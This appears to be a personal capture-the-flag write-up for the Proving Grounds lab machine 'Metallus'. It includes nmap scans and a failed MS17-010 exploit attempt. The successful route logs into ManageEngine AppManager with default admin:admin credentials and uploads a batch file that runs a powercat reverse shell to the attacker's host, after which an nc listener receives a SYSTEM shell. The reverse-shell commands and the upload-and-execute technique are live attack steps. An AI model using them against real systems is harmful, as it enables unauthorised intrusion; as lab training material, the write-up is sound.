# Metallus

1. Port scanning reveals something on 40443 (I missed this on my look, had to use a writeup)
2. Service default credentials is `admin`:`admin`
3. On looking through the service, can upload a batch file

# Enumeration
```
[*] Finished scanning all targets in 30 minutes, 23 seconds!
[*] Don't forget to check out more commands to run manually in the _manual_commands.txt file in each target's scans directory!
[!] AutoRecon identified the following services, but could not match them to any plugins based on the service name. Please report these to Tib3rius: tcp/12000/cce4x/insecure, tcp/5040/unknown/insecure, tcp/12000/tcpwrapped/insecure, tcp/49670/tcpwrapped/insecure, tcp/49693/tcpwrapped/insecure, tcp/49718/tcpwrapped/insecure, tcp/49796/tcpwrapped/insecure, tcp/49797/tcpwrapped/insecure                                                                                                                      
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus]
└─$ 

```

## Nmap

```
──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus]
└─$ sudo nmap -p- 192.168.234.96 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-24 04:40 EST
Nmap scan report for 192.168.234.96
Host is up (0.25s latency).
Not shown: 65517 filtered ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
12000/tcp open  cce4x?
22222/tcp open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
40443/tcp open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  tcpwrapped
49693/tcp open  java-rmi      Java RMI
49718/tcp open  unknown
49796/tcp open  unknown
49797/tcp open  unknown
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port12000-TCP:V=7.91%I=7%D=1/24%Time=61EE75C7%P=x86_64-pc-linux-gnu%r(K
SF:erberos,16,"\0\0\0\x12\0\tRECONNECT\0\x010\0\0\0\0")%r(SMBProgNeg,16,"\
SF:0\0\0\x12\0\tRECONNECT\0\x010\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port40443-TCP:V=7.91%I=7%D=1/24%Time=61EE7586%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,246,"HTTP/1\.1\x20200\x20\r\nSet-Cookie:\x20JSESSIONID_APM_40
SF:443=060D40E4F1584C8F00BEAF36D75623B7;\x20Path=/;\x20HttpOnly\r\nAccept-
SF:Ranges:\x20bytes\r\nETag:\x20W/\"261-1591076589000\"\r\nLast-Modified:\
SF:x20Tue,\x2002\x20Jun\x202020\x2005:43:09\x20GMT\r\nContent-Type:\x20tex
SF:t/html\r\nContent-Length:\x20261\r\nDate:\x20Mon,\x2024\x20Jan\x202022\
SF:x2009:46:46\x20GMT\r\nConnection:\x20close\r\nServer:\x20AppManager\r\n
SF:\r\n<!--\x20\$Id\$\x20-->\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD
SF:\x20HTML\x204\.01\x20Transitional//EN\">\n<html>\n<head>\n<!--\x20This\
SF:x20comment\x20is\x20for\x20Instant\x20Gratification\x20to\x20work\x20ap
SF:plications\.do\x20-->\n<script>\n\n\twindow\.open\(\"/webclient/common/
SF:jsp/home\.jsp\",\x20\"_top\"\);\n\n</script>\n\n</head>\n</html>\n")%r(
SF:HTTPOptions,841,"HTTP/1\.1\x20403\x20\r\nSet-Cookie:\x20JSESSIONID_APM_
SF:40443=5273562EF1BF5AAE68F4BB6B1823956D;\x20Path=/;\x20HttpOnly\r\nCache
SF:-Control:\x20private\r\nExpires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:
SF:00\x20GMT\r\nContent-Type:\x20text/html;charset=UTF-8\r\nContent-Length
SF::\x201810\r\nDate:\x20Mon,\x2024\x20Jan\x202022\x2009:46:47\x20GMT\r\nC
SF:onnection:\x20close\r\nServer:\x20AppManager\r\n\r\n<meta\x20http-equiv
SF:=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n<meta\x20http-equiv=\"Con
SF:tent-Type\"\x20content=\"UTF-8\">\n<!--\$Id\$-->\n\n\n\n\n\n\n\n\n\n<ht
SF:ml>\n<head>\n<title>Applications\x20Manager</title>\n\n<link\x20REL=\"S
SF:HORTCUT\x20ICON\"\x20HREF=\"/favicon\.ico\">\n\n</head>\n\n<body\x20sty
SF:le=\"background-color:#fff;\">\n\n<style\x20type=\"text/css\">\n\t#cont
SF:ainer-error\n\t{\n\t\tborder:1px\x20solid\x20#c1c1c1;\n\t\tbackground:\
SF:x20#fff;\x20font:11px\x20Arial,\x20Helvetica,\x20sans-serif;\x20width:9
SF:0%;\x20margin:80px;\n\t\x20\t\n\t}\n\n\t#header-error\n\t{\n\t\tbackgro
SF:und:\x20#ededed;\x20line-height:18px;\n\t\tpadding:\x2015px;\x20color:#
SF:000;\x20font-size:8px;\n\t}\n\n\t#header-error\x20h1\n\t{\n\t\tmargin:\
SF:x200;\x20\x20color:#000;\n\t\tfont-")%r(RTSPRequest,912,"HTTP/1\.1\x205
SF:05\x20\r\nvary:\x20accept-encoding\r\nContent-Type:\x20text/html;charse
SF:t=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x202142\r\nDate:\
SF:x20Mon,\x2024\x20Jan\x202022\x2009:46:47\x20GMT\r\nServer:\x20AppManage
SF:r\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20St
SF:atus\x20505\x20\xe2\x80\x93\x20HTTP\x20Version\x20Not\x20Supported</tit
SF:le><style\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-ser
SF:if;color:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fo
SF:nt-size:16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:whit
SF:e;background-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tah
SF:oma,Arial,sans-serif;color:black;background-color:white;}\x20b\x20{font
SF:-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\
SF:x20p\x20{font-family:Tahoma,Arial,sans-serif;background:white;color:bla
SF:ck;font-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}
SF:\x20\.line\x20{height:1px;background-color:#");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49796-TCP:V=7.91%I=7%D=1/24%Time=61EE75B5%P=x86_64-pc-linux-gnu%r(K
SF:erberos,1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(SMBProgNeg,1
SF:A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(X11Probe,1A,"\0\0\0\x
SF:16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(ms-sql-s,1A,"\0\0\0\x16\0\rCLOSE
SF:_SESSION\0\x010\0\0\0\0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49797-TCP:V=7.91%I=7%D=1/24%Time=61EE75B4%P=x86_64-pc-linux-gnu%r(K
SF:erberos,1A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(SMBProgNeg,1
SF:A,"\0\0\0\x16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(X11Probe,1A,"\0\0\0\x
SF:16\0\rCLOSE_SESSION\0\x010\0\0\0\0")%r(ms-sql-s,1A,"\0\0\0\x16\0\rCLOSE
SF:_SESSION\0\x010\0\0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 546.26 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus]
└─$ cd ../             

```

```
# Nmap 7.91 scan initiated Sun Jan 16 09:30:09 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus/results/192.168.225.96/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus/results/192.168.225.96/scans/xml/_full_tcp_nmap.xml" 192.168.225.96
Nmap scan report for 192.168.225.96
Host is up, received user-set (0.24s latency).
Scanned at 2022-01-16 09:30:11 EST for 825s
Not shown: 65518 filtered ports
Reason: 65518 no-responses
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 127
5040/tcp  open  unknown       syn-ack ttl 127
12000/tcp open  tcpwrapped    syn-ack ttl 127
22222/tcp open  ssh           syn-ack ttl 127 OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 e5:92:a8:a8:57:16:73:42:1a:9b:c2:f2:e3:bd:8a:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPRX/k9OawrX2MoDMvpP4AxvlThR+kYfdnKc5cAG1+U8UMoQkVJHlXZtFeFaaCSydgVbydrVQsgsS4IVyo2Fzpb6PM51PIySCrpAjTRum5042XEyO1JaeRHhwM9mP8WRhUl9qvfog58wGnkjqxe9WAgQ3p8SvCPj/uiwIf0sjBQKIb/Adc8nJZNN1RNaFGckd/RAfVbI1YPPu7bG3M2JV9OQg9Pcwf+w458DMQ4XeZzk55VE1WIXSSU9q9OQI/zeRBsyot6LsoSSx1TKl7GFa96DJ7xpsQUrRa31CIrZ81646zX0opA5dNZ5CkhouWCF/4Ja1rR5V9bSnvuoOvW6KO88ICzJRGwd7KhiEf00K5XCpSQr4zPvqHpKoK9yATYRZ9ZE63AuJkBKlMMoqtYbIyHmYPykhkVdPPLviA2+613hryu5PGv36bl6TmTPyi3z9W4ufM1X6zv4DjpyhDIhDEfP8QkvFLaYD8YS5bKvPzu4tNh3lTjqIE2gmWaWjHaik=
|   256 71:16:46:72:7a:05:c9:77:4e:c5:96:43:96:31:a6:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJP6P3lKM0ZhbP6fzT5Xsva0PlhH5/9T7Um8xVANBO9d7/BXky0IQE0bLDwVUtIZFCsCNumHea2+WFTh5kMnVas=
|   256 e3:42:cf:ff:ba:71:ff:27:09:fa:4d:d5:52:99:59:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKYI1DU4WSTpKHDyonGLO6VQlMHtmxaEDAH4+4It1CbA
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  tcpwrapped    syn-ack ttl 127
49693/tcp open  tcpwrapped    syn-ack ttl 127
49718/tcp open  tcpwrapped    syn-ack ttl 127
49796/tcp open  tcpwrapped    syn-ack ttl 127
49797/tcp open  tcpwrapped    syn-ack ttl 127
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|2008|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/16%OT=135%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61E42F2C%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=U)
OPS(O1=M506NW8NNS%O2=M506NW8NNS%O3=M506NW8%O4=M506NW8NNS%O5=M506NW8NNS%O6=M506NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58981/tcp): CLEAN (Timeout)
|   Check 2 (port 20165/tcp): CLEAN (Timeout)
|   Check 3 (port 40224/udp): CLEAN (Timeout)
|   Check 4 (port 35321/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-16T14:43:21
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   244.08 ms 192.168.49.1
2   244.11 ms 192.168.225.96

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 16 09:43:56 2022 -- 1 IP address (1 host up) scanned in 827.94 seconds

```

### Vuln
```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap --script vuln -p- 192.168.225.96
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-16 09:34 EST
Stats: 0:03:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 36.53% done; ETC: 09:43 (0:05:06 remaining)
Stats: 0:10:35 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 83.19% done; ETC: 09:47 (0:02:06 remaining)
Nmap scan report for 192.168.225.96
Host is up (0.24s latency).
Not shown: 65517 filtered ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
12000/tcp open  cce4x
22222/tcp open  easyengine
40443/tcp open  unknown
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49847/tcp open  unknown
49870/tcp open  unknown
49894/tcp open  unknown
49949/tcp open  unknown
49950/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Nmap done: 1 IP address (1 host up) scanned in 876.65 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

## 135 - RPC

## 139/445 - SMB

Cannot login

Exploit test
```
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus]
└─$ ./exploit.sh                        
Cloning into 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Receiving objects: 100% (202/202), 118.50 KiB | 5.15 MiB/s, done.
Resolving deltas: 100% (115/115), done.
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
listening on [any] 1111 ...
Trying to connect to 192.168.234.96:445
Traceback (most recent call last):
  File "send_and_execute.py", line 1077, in <module>
    exploit(target, port, pipe_name)
  File "send_and_execute.py", line 794, in exploit
    conn = MYSMB(target, port)
  File "/tmp/metallus/MS17-010/mysmb.py", line 118, in __init__
    smb.SMB.__init__(self, remote_host, remote_host, sess_port=remote_port, timeout=timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/smb.py", line 2415, in __init__
    self.neg_session()
  File "/tmp/metallus/MS17-010/mysmb.py", line 147, in neg_session
    smb.SMB.neg_session(self, extended_security=self.__use_ntlmv2, negPacket=negPacket)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/smb.py", line 2626, in neg_session
    smb = self.recvSMB()
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/smb.py", line 2494, in recvSMB
    r = self._sess.recv_packet(self.__timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/nmb.py", line 854, in recv_packet
    data = self.__read(timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/nmb.py", line 932, in __read
    data = self.read_function(4, timeout)
  File "/home/kali/.local/lib/python2.7/site-packages/impacket/nmb.py", line 919, in non_polling_read
    received = self._sock.recv(bytes_left)
socket.error: [Errno 104] Connection reset by peer

^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Metallus]
└─$
```

## 5040 

## 12000 - TCPWrapped

## 22222 - OpenSSH

## 40443 - 


Found this online in their nmap scans

`admin`:`admin`

![](Pasted%20image%2020220124185603.png)

![](Pasted%20image%2020220124185704.png)

![](Pasted%20image%2020220124185823.png)


## Exploit Test

to install javac install openjdk

```

```

![](Pasted%20image%2020220124193304.png)

![](Pasted%20image%2020220124193455.png)

![](Pasted%20image%2020220124193859.png)

![](Pasted%20image%2020220124193945.png)



# Exploitation

I generated a batfile using `pwsh` and `powercat`

```
┌──(kali㉿kali)-[/tmp]
└─$ pwsh             
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

   A new PowerShell stable release is available: v7.2.1 
   Upgrade now, or check out the release page at:       
     https://aka.ms/PowerShell-Release?tag=v7.2.1       


PS /tmp> . ./powercat.ps1
PS /tmp> powercat -c 192.168.49.234 -p 443 -e cmd -ge
ZgB1AG4AYwB0AGkAbwBuACA
....
```

`exploit.bat`

```
powershell -e ZgB1AG4AYwB0AGkAbwBuACA...
```

I uploaded a bat file, and configured the action to execute the bat file

![](Pasted%20image%2020220124214757.png)

![](Pasted%20image%2020220124214818.png)


![](Pasted%20image%2020220124214603.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 443                                                                                                                                               1 ⨯
[sudo] password for kali: 
listening on [any] 443 ...
connect to [192.168.49.234] from (UNKNOWN) [192.168.234.96] 49933
Microsoft Windows [Version 10.0.18362.1082]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Program Files\ManageEngine\AppManager14\working>whoami
whoami
nt authority\system

C:\Program Files\ManageEngine\AppManager14\working>cd \Users\Administrator\Desktop
cd \Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
39eb7720930d379bc2da7362001083e9

C:\Users\Administrator\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::dc5a:e154:963e:c442%11
   IPv4 Address. . . . . . . . . . . : 192.168.234.96
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.234.254

C:\Users\Administrator\Desktop>

```

![](Pasted%20image%2020220124214905.png)

# Others
OpenSSH
https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1292
